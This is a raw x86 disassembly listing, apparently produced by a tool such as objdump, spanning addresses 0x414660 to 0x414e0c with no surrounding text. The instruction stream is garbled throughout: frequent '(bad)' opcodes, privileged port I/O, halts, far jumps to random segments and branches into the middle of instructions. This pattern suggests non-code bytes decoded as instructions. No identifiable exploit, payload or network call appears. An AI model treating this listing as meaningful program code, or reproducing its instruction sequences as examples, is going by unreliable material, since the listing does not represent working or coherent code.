  414660:	mov    eax,ds:0x1a67bf8e
  414665:	mov    BYTE PTR [esp+esi*2-0x80],0xce
  41466a:	jo     0x41465e
  41466c:	dec    edx
  41466d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466e:	xlat   BYTE PTR ds:[ebx]
  41466f:	clc    
  414670:	sti    
  414671:	stos   DWORD PTR es:[edi],eax
  414672:	enter  0x51ad,0xed
  414676:	and    eax,0x68432de6
  41467b:	jno    0x41465e
  41467d:	stos   DWORD PTR es:[edi],eax
  41467e:	sbb    eax,0x420991dc
  414683:	cs xchg esp,eax
  414685:	mov    esi,0x710fe8af
  41468a:	fwait
  41468b:	jne    0x4146c0
  41468d:	mov    bh,0xd2
  41468f:	hlt    
  414690:	sub    eax,0xce70de99
  414695:	and    bh,ah
  414697:	sbb    eax,0x54e81ae5
  41469c:	inc    eax
  41469d:	inc    eax
  41469e:	push   cs
  41469f:	cmp    BYTE PTR [esp+ebp*4+0x20],0xf2
  4146a4:	adc    BYTE PTR [esi-0x5b],bh
  4146a7:	push   edi
  4146a8:	add    esi,DWORD PTR [ebp-0x7db53753]
  4146ae:	lea    esp,[esi+0x6d48c03a]
  4146b4:	pop    edx
  4146b5:	div    BYTE PTR [eax-0x2829630c]
  4146bb:	(bad)  
  4146bc:	fsub   DWORD PTR [ebp+eax*2-0x53e3b8a9]
  4146c3:	test   BYTE PTR ds:0x64900cf4,cl
  4146c9:	mov    ebp,0x7e5c21f3
  4146ce:	or     eax,DWORD PTR gs:[ebx+ecx*8+0x348f717e]
  4146d6:	(bad)  
  4146d7:	lods   eax,DWORD PTR ds:[esi]
  4146d8:	and    al,0x81
  4146da:	pop    ds
  4146db:	and    DWORD PTR [esp+eax*8],ebx
  4146de:	shl    bl,cl
  4146e0:	lea    edx,[eax-0x39]
  4146e3:	repz jb 0x4146c9
  4146e6:	fld    DWORD PTR [ebx]
  4146e8:	ret    0x26ff
  4146eb:	mov    ch,0x15
  4146ed:	fisubr WORD PTR [eax-0x7d78d0a4]
  4146f3:	jge    0x414758
  4146f5:	pop    ebx
  4146f6:	push   ecx
  4146f7:	int3   
  4146f8:	xor    ebp,edx
  4146fa:	sbb    eax,0x7940beba
  4146ff:	xlat   BYTE PTR ds:[ebx]
  414700:	mov    ah,BYTE PTR ds:0x4cc9b6ea
  414706:	rep lods al,BYTE PTR ds:[esi]
  414708:	sar    DWORD PTR [esi+0xf],0x3b
  41470c:	in     al,dx
  41470d:	(bad)  
  41470e:	hlt    
  41470f:	mov    ah,0x97
  414711:	mov    ebp,DWORD PTR [edx]
  414713:	aam    0x83
  414715:	pop    bp
  414717:	and    DWORD PTR [ebx+0x664358d3],esi
  41471d:	mov    ebp,fs
  41471f:	leave  
  414720:	add    bh,BYTE PTR [edi+0x1c672c42]
  414726:	sbb    BYTE PTR [ebx+0x5eb9401f],cl
  41472c:	mov    esi,0x396bfbd3
  414731:	dec    esp
  414732:	addr16 mov edi,0x862b71b0
  414738:	into   
  414739:	mov    ebp,0x9f6be364
  41473e:	arpl   WORD PTR [edx-0x3840bb5f],dx
  414744:	push   esp
  414745:	and    ch,BYTE PTR [edi+0x34391f38]
  41474b:	lods   al,BYTE PTR ds:[esi]
  41474c:	(bad)  
  41474d:	sbb    eax,0xb40e447
  414752:	mov    esi,0xf1c0e878
  414757:	jb     0x4146db
  414759:	sub    bh,BYTE PTR [edi+0x522d3176]
  41475f:	cld    
  414760:	(bad)  
  414762:	frstor [esi+0x30f1f934]
  414768:	pop    ebp
  414769:	mov    ecx,0xd05969fa
  41476e:	gs imul ebx,eax,0x5a
  414772:	adc    eax,0x46183376
  414777:	dec    ebp
  414778:	sbb    al,0xac
  41477a:	ret    
  41477b:	adc    ecx,DWORD PTR [edx-0x4d6a1bf8]
  414781:	jmp    0xac4f5fed
  414786:	outs   dx,BYTE PTR ds:[esi]
  414787:	dec    BYTE PTR fs:[edi-0x3c]
  41478b:	stos   DWORD PTR es:[edi],eax
  41478c:	cli    
  41478d:	mov    eax,0x8f32f589
  414792:	test   al,0xa2
  414794:	retf   
  414795:	psubusw mm4,QWORD PTR [ebp+0x46]
  414799:	fst    DWORD PTR [ebx-0x6154a68a]
  41479f:	push   edx
  4147a0:	addr16 or eax,0x9be5baf3
  4147a6:	push   eax
  4147a7:	jae    0x414776
  4147a9:	mov    BYTE PTR [esi-0x2a],bl
  4147ac:	rol    ecx,0x5d
  4147af:	ds das 
  4147b1:	stos   BYTE PTR es:[edi],al
  4147b2:	aad    0xdd
  4147b4:	jae    0x41481c
  4147b6:	cld    
  4147b7:	lock stc 
  4147b9:	push   0x40
  4147bb:	jmp    0xe6f5:0x40a892f1
  4147c2:	jle    0x414825
  4147c4:	cmp    DWORD PTR [ebx+0x4ef7d71],esp
  4147ca:	or     al,0x99
  4147cc:	push   esp
  4147cd:	pusha  
  4147ce:	out    dx,eax
  4147cf:	lds    esp,FWORD PTR [ebx]
  4147d1:	cld    
  4147d2:	xor    al,0x5c
  4147d4:	(bad)  
  4147d6:	inc    eax
  4147d7:	(bad)  
  4147d8:	fs leave 
  4147da:	mov    edx,0x46d18796
  4147df:	inc    dl
  4147e1:	(bad)  
  4147e2:	adc    eax,0xa8c475d9
  4147e7:	pop    edi
  4147e8:	mov    DWORD PTR [ecx+0x36],eax
  4147eb:	pop    ebp
  4147ec:	ins    BYTE PTR es:[edi],dx
  4147ed:	js     0x4147c3
  4147ef:	sub    eax,0x33d59055
  4147f4:	add    al,0x6a
  4147f6:	(bad)  
  4147f7:	stc    
  4147f8:	test   eax,0x7e898378
  4147fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fe:	mov    esp,0x590d7a5b
  414803:	xor    ecx,esp
  414805:	jbe    0x4147a3
  414807:	hlt    
  414808:	cmp    al,0xa8
  41480a:	inc    esp
  41480b:	icebp  
  41480c:	inc    esi
  41480d:	enter  0x3eb7,0xb7
  414811:	fst    DWORD PTR [edx-0x17f0534f]
  414817:	iret   
  414818:	out    0x70,al
  41481a:	adc    DWORD PTR [edi+0x72],edx
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	(bad)  
  41481f:	int3   
  414820:	xchg   esi,eax
  414821:	retf   
  414822:	sub    ebp,DWORD PTR ds:0x1fb98b01
  414828:	out    0x84,al
  41482a:	push   esi
  41482b:	dec    edx
  41482c:	add    ah,dh
  41482e:	scas   al,BYTE PTR es:[edi]
  41482f:	call   0x84f9d2f6
  414834:	mov    esi,0x9f8f8320
  414839:	cs out 0x70,eax
  41483c:	mov    ebp,edi
  41483e:	xor    DWORD PTR [edx],ebx
  414840:	xchg   esp,eax
  414841:	in     eax,dx
  414842:	xchg   edi,eax
  414843:	into   
  414844:	jl     0x414874
  414846:	mov    ds:0x8d4e5276,al
  41484b:	sahf   
  41484c:	and    al,0xa5
  41484e:	out    0x3d,eax
  414850:	repnz dec eax
  414852:	xchg   DWORD PTR [edx+0x8871edc],edi
  414858:	(bad)
  41485c:	sahf   
  41485d:	sbb    al,0xde
  41485f:	retf   
  414860:	outs   dx,BYTE PTR ds:[esi]
  414861:	es int 0xed
  414864:	cmc    
  414865:	outs   dx,DWORD PTR ds:[esi]
  414866:	jl     0x4148b8
  414868:	loopne 0x4147f8
  41486a:	div    DWORD PTR [esp+esi*1+0x3c]
  41486e:	jnp    0x414858
  414870:	sbb    DWORD PTR [eax+0x2],ecx
  414873:	sbb    ebp,DWORD PTR [eax-0x26]
  414876:	xchg   DWORD PTR [edi-0x43],ebx
  414879:	dec    ecx
  41487a:	mov    cl,BYTE PTR [ebp-0x17]
  41487d:	dec    ecx
  41487e:	adc    BYTE PTR [edx],0xaf
  414881:	mov    ebp,0xc7c81d47
  414886:	sti    
  414887:	icebp  
  414888:	xor    esp,DWORD PTR [eax+0x69aef728]
  41488e:	(bad)  
  414890:	add    DWORD PTR [ebx-0x34],ebp
  414893:	mov    ds:0xc4508cde,al
  414898:	nop
  414899:	ret    0x70d6
  41489c:	and    BYTE PTR [ecx-0x56fd34d9],bh
  4148a2:	fbld   TBYTE PTR [ecx]
  4148a4:	push   es
  4148a5:	icebp  
  4148a6:	mov    eax,gs:0xeddb762f
  4148ac:	jmp    0x1e21c8e6
  4148b1:	cdq    
  4148b2:	mov    ebp,0xcba4149e
  4148b7:	aaa    
  4148b8:	cmp    eax,0x200d3ec0
  4148bd:	and    BYTE PTR [ebx-0x42],al
  4148c0:	test   eax,0x26b34aa9
  4148c5:	aad    0xb1
  4148c7:	adc    edx,DWORD PTR [ebx-0x5c]
  4148ca:	and    al,BYTE PTR [eax]
  4148cc:	xor    DWORD PTR [eax-0x1d97ebbb],edi
  4148d2:	call   0xeb1a:0xe003e292
  4148d9:	xchg   edx,eax
  4148da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148db:	idiv   eax
  4148dd:	(bad)  
  4148de:	in     eax,0xfb
  4148e0:	aas    
  4148e1:	sub    al,0x2c
  4148e3:	call   0xf741:0x1c232239
  4148ea:	pusha  
  4148eb:	out    dx,al
  4148ec:	mov    BYTE PTR [ecx-0x32bbf387],ch
  4148f2:	sbb    ch,dh
  4148f4:	xchg   BYTE PTR [eax],dl
  4148f6:	push   0xd8b3a659
  4148fb:	les    edx,FWORD PTR [esi]
  4148fd:	adc    dl,BYTE PTR [ebp-0x732069df]
  414903:	test   al,0xbd
  414905:	add    al,0xd2
  414907:	mov    edi,0x2b3ce79b
  41490c:	add    eax,0x6c769f6d
  414911:	rcl    DWORD PTR [edi-0x72],1
  414914:	sbb    eax,DWORD PTR [eax]
  414916:	inc    edi
  414917:	lods   al,BYTE PTR ds:[esi]
  414918:	es es push eax
  41491b:	mov    dl,0x21
  41491d:	ins    BYTE PTR es:[edi],dx
  41491e:	js     0x4148e3
  414920:	inc    esp
  414921:	sbb    eax,0x1fa9397f
  414926:	xor    BYTE PTR [esi+0x16dfc1aa],al
  41492c:	and    dl,dh
  41492e:	add    ecx,ebx
  414930:	xchg   esi,eax
  414931:	mov    ch,0xa9
  414933:	(bad)  
  414934:	lods   eax,DWORD PTR ds:[esi]
  414935:	push   es
  414936:	and    DWORD PTR [edi],esp
  414938:	fs loope 0x414983
  41493b:	mov    cl,0x9e
  41493d:	push   ebx
  41493e:	xor    esp,esi
  414940:	jle    0x41498d
  414942:	mov    ebx,DWORD PTR [ecx+0x65e80f8c]
  414948:	or     DWORD PTR [eax+0x6eab883f],edx
  41494e:	sub    al,0x67
  414950:	int3   
  414951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414952:	jmp    0x4149cf
  414954:	or     ebp,edx
  414956:	repnz or BYTE PTR [edx+0x4c],bl
  41495a:	enter  0x7d97,0xbf
  41495e:	icebp  
  41495f:	js     0x414978
  414961:	push   edx
  414962:	xor    BYTE PTR [ecx],dh
  414964:	sub    dl,BYTE PTR [ecx-0x1134146a]
  41496a:	inc    ecx
  41496b:	and    BYTE PTR [edx-0x14],cl
  41496e:	mov    WORD PTR [edi+0x23],ss
  414971:	jnp    0x4149a5
  414973:	inc    ebx
  414974:	aad    0x1a
  414976:	fdiv   DWORD PTR [ebx-0x2b]
  414979:	dec    edi
  41497a:	out    0x3a,al
  41497c:	loopne 0x414926
  41497e:	(bad)
  414982:	out    0x62,al
  414984:	xchg   ebp,eax
  414985:	jb     0x414935
  414987:	fninit 
  414989:	mov    eax,ds:0xcd41b733
  41498e:	mov    dh,0x4b
  414990:	es imul edi,ecx,0x61
  414994:	stos   BYTE PTR es:[edi],al
  414995:	sahf   
  414996:	ds ds loop 0x414937
  41499a:	or     ebp,eax
  41499c:	rol    BYTE PTR [eax],0x6d
  41499f:	xchg   ebp,eax
  4149a0:	lods   al,BYTE PTR ds:[esi]
  4149a1:	or     DWORD PTR [edx],eax
  4149a3:	cmp    BYTE PTR [esi],ch
  4149a5:	adc    DWORD PTR [ecx-0x15],esp
  4149a8:	add    al,0x93
  4149aa:	in     al,dx
  4149ab:	adc    BYTE PTR [edx-0x26],dh
  4149ae:	mov    edx,0xdb2544ce
  4149b3:	inc    eax
  4149b4:	or     al,0x75
  4149b6:	cmc    
  4149b7:	mov    edx,0xcc089afc
  4149bc:	fistp  WORD PTR [edi+0x1f]
  4149bf:	adc    al,0xec
  4149c1:	rcl    BYTE PTR [edx-0x32],cl
  4149c4:	add    eax,0xc5d61912
  4149c9:	mov    esp,0x8a638583
  4149ce:	test   al,0x9f
  4149d0:	pop    eax
  4149d1:	data16 sbb BYTE PTR [eax],dl
  4149d4:	in     eax,dx
  4149d5:	test   BYTE PTR [ebx],dl
  4149d7:	arpl   WORD PTR [ebp-0x22e70ed1],si
  4149dd:	xor    bh,bh
  4149df:	fcomi  st,st(4)
  4149e1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4149e3:	ins    BYTE PTR es:[edi],dx
  4149e4:	dec    ebx
  4149e5:	popa   
  4149e6:	push   cs
  4149e7:	pop    ds
  4149e8:	retf   0xb203
  4149eb:	xlat   BYTE PTR ds:[ebx]
  4149ec:	pop    esi
  4149ed:	mov    BYTE PTR [ecx],cl
  4149ef:	xchg   esi,eax
  4149f0:	fst    DWORD PTR [edi+0x7f40155d]
  4149f6:	retf   
  4149f7:	(bad)  
  4149f8:	ror    BYTE PTR [edi],0x25
  4149fb:	jmp    0x93e3:0xe00549a7
  414a02:	xor    BYTE PTR [ebx+edi*4-0x46f7e7db],cl
  414a09:	xchg   ebx,eax
  414a0a:	cmp    DWORD PTR [ebx+0x101c0904],0x5d
  414a11:	lgs    eax,FWORD PTR [edi+eax*1+0x7d0da5e0]
  414a19:	sbb    eax,0xf1e132fd
  414a1e:	mov    eax,0x8fce7cdb
  414a23:	ins    BYTE PTR es:[edi],dx
  414a24:	dec    edi
  414a25:	mov    ebp,0x6f2af2d2
  414a2a:	popf   
  414a2b:	and    DWORD PTR [esi-0x51],edx
  414a2e:	jbe    0x414a51
  414a30:	and    BYTE PTR [ecx+eax*8-0x6f1c98dd],0xd4
  414a38:	aas    
  414a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a3a:	(bad)  
  414a3b:	dec    esp
  414a3c:	jmp    0x414aa4
  414a3e:	fidiv  DWORD PTR [eax]
  414a40:	inc    ecx
  414a41:	or     ebx,DWORD PTR [eax]
  414a43:	and    al,0x31
  414a45:	ret    
  414a46:	mov    dh,0x1c
  414a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a49:	mov    esp,0x38a7ec3e
  414a4e:	pop    eax
  414a4f:	push   edi
  414a50:	fadd   QWORD PTR [eax]
  414a52:	or     edi,DWORD PTR [edi-0x19d172db]
  414a58:	and    eax,0xd7b81cfd
  414a5d:	inc    edi
  414a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a5f:	in     eax,dx
  414a60:	dec    eax
  414a61:	mov    bl,0xb
  414a63:	int    0x68
  414a65:	faddp  st(6),st
  414a67:	test   DWORD PTR [edx],0xbef27964
  414a6d:	test   eax,0x809b063a
  414a72:	stos   DWORD PTR es:[edi],eax
  414a73:	je     0x414acc
  414a75:	js     0x414a68
  414a77:	jne    0x414aba
  414a79:	inc    ecx
  414a7a:	mov    eax,0x75f0c10d
  414a7f:	xor    eax,0x3b8bf403
  414a84:	mov    esp,0xdd67527
  414a89:	push   ds
  414a8a:	mov    ds:0x295d0b07,al
  414a8f:	icebp  
  414a90:	adc    al,0x94
  414a92:	xchg   esp,eax
  414a93:	addr16 jns 0x414a6f
  414a96:	addr16 addr16 pop es
  414a99:	adc    al,cl
  414a9b:	ret    
  414a9c:	add    eax,0x72a566dc
  414aa1:	lock sub DWORD PTR [ebx],edx
  414aa4:	jp     0x414b02
  414aa6:	and    ebp,DWORD PTR [edx-0x7cd31ddf]
  414aac:	xor    eax,DWORD PTR [edi-0x23]
  414aaf:	adc    bl,BYTE PTR [edi-0x3e]
  414ab2:	push   ebx
  414ab3:	out    0x27,eax
  414ab5:	cdq    
  414ab6:	ds dec ebp
  414ab8:	(bad)  
  414aba:	push   ebp
  414abb:	xor    al,0x4e
  414abd:	sbb    DWORD PTR [ecx+eiz*2],esi
  414ac0:	mov    bl,cl
  414ac2:	sub    al,0x7e
  414ac4:	jnp    0x414a50
  414ac6:	(bad)  
  414ac7:	ins    BYTE PTR es:[edi],dx
  414ac8:	outs   dx,DWORD PTR ds:[esi]
  414ac9:	enter  0x63f6,0x5c
  414acd:	pop    esi
  414ace:	jmp    0x414a5a
  414ad0:	neg    BYTE PTR [edx]
  414ad2:	adc    al,0x57
  414ad4:	nop
  414ad5:	rol    DWORD PTR [ecx-0x28],1
  414ad8:	out    0xbd,eax
  414ada:	jae    0x414b40
  414adc:	jge    0x414a78
  414ade:	mov    dh,0xba
  414ae0:	iret   
  414ae1:	int3   
  414ae2:	outs   dx,DWORD PTR ds:[esi]
  414ae3:	pusha  
  414ae4:	cmc    
  414ae5:	inc    edx
  414ae6:	int    0x3a
  414ae8:	cwde   
  414ae9:	test   DWORD PTR [eax+0x2689c3bd],esi
  414aef:	add    edi,DWORD PTR [ecx+eax*8+0x50606376]
  414af6:	xchg   ebx,eax
  414af7:	sub    DWORD PTR [eax+0x709cd02b],ecx
  414afd:	out    0x2a,al
  414aff:	jmp    FWORD PTR [edx-0x704b1575]
  414b05:	les    ecx,FWORD PTR [ebx+0x14f7291e]
  414b0b:	adc    DWORD PTR [esi],eax
  414b0d:	inc    ebx
  414b0e:	int    0x9f
  414b10:	or     BYTE PTR [edi+0x5c],0x68
  414b14:	adc    esi,DWORD PTR [edx-0x5a]
  414b17:	cwde   
  414b18:	push   0xffffffff
  414b1a:	aaa    
  414b1b:	pop    ebx
  414b1c:	out    dx,eax
  414b1d:	pushf  
  414b1e:	repnz pop ecx
  414b20:	das    
  414b21:	mov    dl,BYTE PTR [ebp-0x39dbd64]
  414b27:	sbb    ah,BYTE PTR [edx+ebp*4-0x216e01ba]
  414b2e:	dec    edx
  414b2f:	popa   
  414b30:	ins    DWORD PTR es:[edi],dx
  414b31:	jecxz  0x414abb
  414b33:	nop
  414b34:	adc    dl,BYTE PTR [edi+0x26]
  414b37:	ins    BYTE PTR es:[edi],dx
  414b38:	jmp    0xa8a6338c
  414b3d:	(bad)  
  414b3e:	scas   eax,DWORD PTR es:[edi]
  414b3f:	or     BYTE PTR [ebx+0x33],ch
  414b42:	cmp    ah,BYTE PTR [ebx-0x6abd8b1f]
  414b48:	ja     0x414b87
  414b4a:	push   cs
  414b4b:	or     al,0x49
  414b4d:	leave  
  414b4e:	dec    esp
  414b4f:	fs rcr ecx,0xe5
  414b53:	ins    BYTE PTR es:[edi],dx
  414b54:	lock pop edi
  414b56:	mov    WORD PTR ds:0x42f351ac,fs
  414b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5d:	pop    es
  414b5e:	jmp    0x1bfb:0xa3b29ef9
  414b65:	xchg   BYTE PTR [edx+edx*8-0x69],bh
  414b69:	mov    bh,0xa8
  414b6b:	mov    ch,0xba
  414b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b6e:	and    eax,DWORD PTR [ecx+0x73419286]
  414b74:	rcr    DWORD PTR [esi],1
  414b76:	ret    0xd328
  414b79:	outs   dx,BYTE PTR ds:[esi]
  414b7a:	aaa    
  414b7b:	xor    eax,0xc90de1c5
  414b80:	and    edi,DWORD PTR [eax+0x77ce65ef]
  414b86:	mov    ds:0x3d628c,al
  414b8b:	(bad)  
  414b8c:	outs   dx,BYTE PTR ds:[esi]
  414b8d:	sub    bl,BYTE PTR [ecx]
  414b8f:	sbb    al,0x1b
  414b91:	cmp    BYTE PTR [eax-0x35cd4239],dh
  414b97:	out    0xa1,eax
  414b99:	inc    edx
  414b9a:	add    ch,dl
  414b9c:	mov    edi,0xdb3c8edf
  414ba1:	loopne 0x414bb7
  414ba3:	add    bh,BYTE PTR [edx+0xa]
  414ba6:	add    al,0xbb
  414ba8:	push   edx
  414ba9:	iret   
  414baa:	fs dec edi
  414bac:	cmp    DWORD PTR [ebp-0x10],esp
  414baf:	neg    DWORD PTR [eax]
  414bb1:	daa    
  414bb2:	out    0x5,al
  414bb4:	ss push es
  414bb6:	sbb    DWORD PTR [ecx-0x25],ebx
  414bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bba:	retf   0x39a2
  414bbd:	sbb    esp,DWORD PTR [ebp-0x1a5a63e1]
  414bc3:	adc    eax,0xc0e6931a
  414bc8:	popf   
  414bc9:	or     al,0xf8
  414bcb:	mov    dh,0x8a
  414bcd:	dec    edx
  414bce:	xchg   DWORD PTR [edx+0x58327ad4],eax
  414bd4:	xchg   edi,eax
  414bd5:	in     eax,0xbb
  414bd7:	xchg   BYTE PTR [ebx+0x1c],ch
  414bda:	and    DWORD PTR [ebx+0x49756f6b],edx
  414be0:	pop    edx
  414be1:	cmp    BYTE PTR [ecx],bh
  414be3:	sar    BYTE PTR [edi],cl
  414be5:	clc    
  414be6:	adc    eax,0x6391a769
  414beb:	mov    ecx,0x68ae87ec
  414bf0:	xchg   edi,eax
  414bf1:	jbe    0x414b7c
  414bf3:	sub    DWORD PTR [eax],0x2ebde0b7
  414bf9:	outs   dx,DWORD PTR ds:[esi]
  414bfa:	out    0xf9,eax
  414bfc:	aad    0x98
  414bfe:	and    DWORD PTR [edx-0x7312d26d],esi
  414c04:	jle    0x414c84
  414c06:	mov    al,ds:0xd0bb0ddf
  414c0b:	ret    0x600d
  414c0e:	(bad)  
  414c0f:	jle    0x414c34
  414c11:	push   ecx
  414c12:	jp     0x414bbf
  414c14:	sbb    bl,BYTE PTR [ecx]
  414c16:	adc    bl,bl
  414c18:	repz mov ecx,0xff656034
  414c1e:	bound  ebp,QWORD PTR [esi+0x491ff349]
  414c24:	ins    BYTE PTR es:[edi],dx
  414c25:	cmp    al,BYTE PTR [edi-0x64]
  414c28:	in     al,0x64
  414c2a:	dec    ecx
  414c2b:	popf   
  414c2c:	pop    ss
  414c2d:	inc    edx
  414c2e:	stos   DWORD PTR es:[edi],eax
  414c2f:	sbb    eax,0x2081098a
  414c34:	and    eax,0x936017a
  414c39:	mov    WORD PTR [eax-0x2c4458de],cs
  414c3f:	adc    eax,DWORD PTR [edx+ebx*2+0x6a]
  414c43:	sbb    eax,0xe31f93e6
  414c48:	lds    edx,FWORD PTR [ecx-0x4e]
  414c4b:	sub    edx,DWORD PTR [eax]
  414c4d:	(bad)  
  414c4e:	mov    dh,0x31
  414c50:	pop    esp
  414c51:	fimul  DWORD PTR [edi]
  414c53:	jns    0x414c25
  414c55:	jp     0x414c76
  414c57:	imul   ebx,DWORD PTR [eax+0x7f66d703],0xffffffed
  414c5e:	push   es
  414c5f:	xor    al,0xdf
  414c61:	and    DWORD PTR [eax+0x24],ebx
  414c64:	sub    esi,DWORD PTR [edx-0x719f74a1]
  414c6a:	(bad)  
  414c6c:	sub    al,0xf0
  414c6e:	test   BYTE PTR ds:0xfd6c0fa1,dh
  414c74:	mov    dl,0xdc
  414c76:	dec    edi
  414c77:	call   0xabc9:0xbd7042cb
  414c7e:	xchg   edi,eax
  414c7f:	push   edx
  414c80:	push   cs
  414c81:	pop    esp
  414c82:	(bad)  
  414c83:	push   ss
  414c84:	push   ecx
  414c85:	mov    ecx,0x9335c1c7
  414c8a:	mov    ch,0xcf
  414c8c:	dec    eax
  414c8d:	sub    DWORD PTR [edx],eax
  414c8f:	xchg   esp,eax
  414c90:	shrd   ebx,esp,0x1b
  414c94:	mov    cl,0x2c
  414c96:	popf   
  414c97:	push   esp
  414c98:	test   DWORD PTR [ebx-0x5cb4007d],ebp
  414c9e:	aaa    
  414c9f:	jmp    0xbe19:0x7f6bf950
  414ca6:	(bad)  
  414ca7:	xlat   BYTE PTR ds:[ebx]
  414ca8:	mov    BYTE PTR [edi+0x46],ah
  414cab:	sbb    cl,BYTE PTR [eax]
  414cad:	mov    BYTE PTR [ecx+ebx*1-0x3d],0x8e
  414cb2:	inc    esp
  414cb3:	pop    edx
  414cb4:	sahf   
  414cb5:	gs dec ebp
  414cb7:	ss ins BYTE PTR es:[edi],dx
  414cb9:	pop    esp
  414cba:	imul   esp,DWORD PTR [edi+ebx*2-0x6b],0x2eb84a89
  414cc2:	sar    BYTE PTR [eax+ebx*2+0x21],cl
  414cc6:	add    eax,0xcffc286f
  414ccb:	mov    cl,0x78
  414ccd:	jbe    0x414d06
  414ccf:	int    0xee
  414cd1:	and    BYTE PTR [edi+0x6f],bl
  414cd4:	popf   
  414cd5:	into   
  414cd6:	pop    eax
  414cd7:	xchg   ecx,eax
  414cd8:	xchg   edi,eax
  414cd9:	cdq    
  414cda:	fsubr  st,st(2)
  414cdc:	and    BYTE PTR [esi-0x7b65150c],cl
  414ce2:	out    0xb7,al
  414ce4:	push   cs
  414ce5:	jmp    0x414d5b
  414ce7:	jmp    0x414d55
  414ce9:	jmp    0x414d52
  414ceb:	pop    ss
  414cec:	fld    QWORD PTR [ebp+esi*4-0x50]
  414cf0:	adc    BYTE PTR [edi+0x52b7b957],cl
  414cf6:	cld    
  414cf7:	dec    edi
  414cf8:	inc    eax
  414cf9:	cmp    DWORD PTR ds:0xd3c3ac63,edi
  414cff:	mov    al,0xe9
  414d01:	xor    DWORD PTR [ebp+0x4],esi
  414d04:	test   eax,0x70a1d207
  414d09:	scas   eax,DWORD PTR es:[edi]
  414d0a:	stos   BYTE PTR es:[edi],al
  414d0b:	xchg   dh,dh
  414d0d:	mov    bh,0xf1
  414d0f:	jbe    0x414d16
  414d11:	imul   BYTE PTR [ebp+0x6eccb9b2]
  414d17:	jb     0x414d55
  414d19:	or     BYTE PTR [esi],0x99
  414d1c:	pop    ss
  414d1d:	sbb    edx,DWORD PTR [esi+0xe]
  414d20:	aad    0xec
  414d22:	sahf   
  414d23:	fsub   DWORD PTR [edx+0x3d7deda3]
  414d29:	jl     0x414d12
  414d2b:	pop    esp
  414d2c:	jmp    0x414da1
  414d2e:	sbb    esp,ebp
  414d30:	test   al,0x5f
  414d32:	pop    esp
  414d33:	dec    esp
  414d34:	sbb    BYTE PTR [eax],cl
  414d36:	add    DWORD PTR [ecx],edi
  414d38:	push   ecx
  414d39:	(bad)  
  414d3b:	sbb    DWORD PTR [esi],ebx
  414d3d:	push   edi
  414d3e:	rcr    BYTE PTR [edi+0x66],cl
  414d41:	(bad)  
  414d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d43:	xchg   ecx,eax
  414d44:	int3   
  414d45:	mov    al,0xe4
  414d47:	mov    esi,0xbadef18f
  414d4c:	(bad)  [esp+ecx*4+0x36]
  414d50:	ret    
  414d51:	sub    eax,0x976627e1
  414d56:	in     al,dx
  414d57:	(bad)  [edx-0x252fde04]
  414d5d:	or     al,0xc6
  414d5f:	mov    cl,0x2f
  414d61:	lods   eax,DWORD PTR ds:[esi]
  414d62:	dec    ebp
  414d63:	jno    0x414d85
  414d65:	sbb    ah,BYTE PTR [eax+0x3e]
  414d68:	inc    ebx
  414d69:	outs   dx,BYTE PTR ds:[esi]
  414d6a:	xor    DWORD PTR [esi+ebp*2+0x42],ebx
  414d6e:	pushf  
  414d6f:	push   eax
  414d70:	push   ebp
  414d71:	sbb    edi,DWORD PTR ss:[ecx]
  414d74:	jnp    0x414d0c
  414d76:	data16 add bh,dh
  414d79:	mov    dl,0x22
  414d7b:	es xchg ebx,eax
  414d7d:	(bad)  
  414d7e:	fcomp  QWORD PTR [esp+edx*2+0x22a057c6]
  414d85:	addr16 push es
  414d87:	scas   al,BYTE PTR es:[edi]
  414d88:	or     edi,eax
  414d8a:	je     0x414d81
  414d8c:	dec    ecx
  414d8d:	add    BYTE PTR [esp+ecx*1-0xd],bh
  414d91:	(bad)  
  414d92:	xchg   ebx,eax
  414d93:	lea    edx,[esi+0x18]
  414d96:	aam    0xb2
  414d98:	ret    
  414d99:	push   esp
  414d9a:	outs   dx,BYTE PTR ds:[esi]
  414d9b:	pushf  
  414d9c:	imul   esp,DWORD PTR [ecx+0x26a20f5f],0x51698f07
  414da6:	pop    edx
  414da7:	dec    edx
  414da8:	mov    ch,0xfe
  414daa:	jl     0x414d34
  414dac:	push   ds
  414dad:	xor    bh,BYTE PTR [ebx-0x4c]
  414db0:	in     eax,0x2a
  414db2:	jp     0x414e0a
  414db4:	and    edx,DWORD PTR [ebx]
  414db6:	out    0xbf,al
  414db8:	ja     0x414e1c
  414dba:	hlt    
  414dbb:	out    dx,eax
  414dbc:	outs   dx,BYTE PTR ds:[esi]
  414dbd:	repz ss out dx,eax
  414dc0:	(bad)  
  414dc2:	add    BYTE PTR [edx+0x4f],bh
  414dc5:	(bad)  [ebx+ecx*4]
  414dc8:	xor    eax,0x3651cbb4
  414dcd:	cmp    DWORD PTR [edx-0x570d6c8a],ebx
  414dd3:	inc    ebx
  414dd4:	loope  0x414e1e
  414dd6:	clc    
  414dd7:	es scas al,BYTE PTR es:[edi]
  414dd9:	out    0xdf,al
  414ddb:	(bad)  
  414ddc:	gs fs jmp 0x414dbb
  414de0:	out    0xaf,eax
  414de2:	clc    
  414de3:	and    eax,0xdf28de3f
  414de8:	fld    QWORD PTR [ebp-0x26]
  414deb:	jo     0x414d73
  414ded:	and    al,0xc2
  414def:	gs dec edx
  414df1:	inc    esp
  414df2:	fst    QWORD PTR [edi]
  414df4:	ror    DWORD PTR [ecx-0x646f5ca7],0xa7
  414dfb:	xor    dl,BYTE PTR [edx+0x28907248]
  414e01:	fwait
  414e02:	jns    0x414e78
  414e04:	fild   QWORD PTR [ebp+0x5e]
  414e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e08:	outs   dx,BYTE PTR ds:[esi]
  414e09:	push   esi
  414e0a:	mov    ah,0xe0
  414e0c:	dec    edi
